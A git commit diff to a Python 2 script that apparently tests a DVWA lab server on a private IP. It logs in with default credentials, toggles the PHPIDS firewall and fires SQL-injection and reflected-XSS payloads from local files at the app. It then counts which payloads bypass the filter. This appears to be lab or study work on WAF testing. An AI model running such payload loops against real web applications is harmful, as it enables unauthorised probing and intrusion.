b3593c4d73f9991dac10442f3c0fe07951d2f3be
babylonQ <mirzad@gmail.com>
2016-09-03 14:01:22 +0200

    xss option started

--- script.py
+++ script.py
@@ -4,18 +4,22 @@ username = 'admin'
 password = 'password'
 
 #read all payload and sort them line by line without \n
-with open("/root/Desktop/payloads") as f:
-	payloads = f.read().splitlines()
+with open("/root/Desktop/sqlipayloads") as f:
+	sqlipayloads = f.read().splitlines()
+
+with open("/root/Desktop/xsspayloads") as f:
+	xsspayloads = f.read().splitlines()
 
 cj = cookielib.CookieJar()
 opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-
 def getFlag():
         if flag == 0:
+		print "----------------------------"
                 print "WAF: OFF"
                 return;
         else:
+		print "----------------------------"
                 print "WAF: ON"
                 return;
 
@@ -40,12 +44,12 @@ while True:
   selection = raw_input("Please select:")
   if selection == '0':
 	if flag == 0:
-		opener.open('http://192.168.57.100/index.php')
-		opener2.open('http://192.168.57.100/security.php?phpids=on')
+		opener.open('http://192.168.1.164/index.php')
+		opener2.open('http://192.168.1.164/security.php?phpids=on')
 		flag = 1
 	else: 
-		opener.open('http://192.168.57.100/index.php')
-                opener2.open('http://192.168.57.100/security.php?phpids=off')
+		opener.open('http://192.168.1.164/index.php')
+                opener2.open('http://192.168.1.164/security.php?phpids=off')
                 flag = 0
 
   if selection == '1':
@@ -56,22 +60,56 @@ while True:
 #	opener2.open('http://192.168.57.100/security.php?phpids=on')
 	# Test each payload from the file
 	count = 0
-	for payload in payloads:
+	attacksucc=0
+	attackfail=0
+	for payload in sqlipayloads:
 		count += 1
-		resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+urllib.quote_plus(payload)+sufix) 
+		resp = opener.open('http://192.168.1.164/vulnerabilities/sqli/?id='+urllib.quote_plus(payload)+sufix) 
 		print "Payload " + str(count) + ": " + payload + " passed to the web app"
 		response = resp.read()
 		# Check if WAF has been triggered
 		if "Hacking" in response:
-			print "Payload " + str(count) + ": " + payload + " did not go through"
+			attackfail+=1
+			print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
 			print "-----------------------------------"
 		else: 
+			attacksucc+=1
 			print "Payload " + str(count) + ": " + payload + " succesfull"
 		      	print "-----------------------------------"
+#			put in array those that succeeded
+	print "Failed attacks: " + str(attackfail)
+	print "Successful attacks: " + str(attacksucc)
 #		print response
 #	break
   elif selection == '2':
-	print "XSS script now needs to run"
+	attacksucc=0
+        attackfail=0
+	count = 0
+        for payload in xsspayloads:
+               count += 1
+               resp = opener.open('http://192.168.1.164/vulnerabilities/xss_r/?name='+urllib.quote_plus(payload)+sufix) 
+               print "Payload " + str(count) + ": " + payload + " passed to the web app"
+               response = resp.read()
+               # Check if WAF has been triggered
+               if "Hacking" in response:
+		       attackfail+=1
+                       print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
+                       print "-----------------------------------"
+               else: 
+		       attacksucc+=1
+                       print "Payload " + str(count) + ": " + payload + " succesfull. Attack succesfull!"
+                       print "-----------------------------------"
+		       #put in array those that succseeded and show them
+	print "Failed attacks: " + str(attackfail)
+        print "Successful attacks: " + str(attacksucc)
+#	print "XSS script now needs to run"
+
+
+
+
+#	http://192.168.1.164/vulnerabilities/xss_r/?name=
+
+
   elif selection == '3':
 	break
   else:
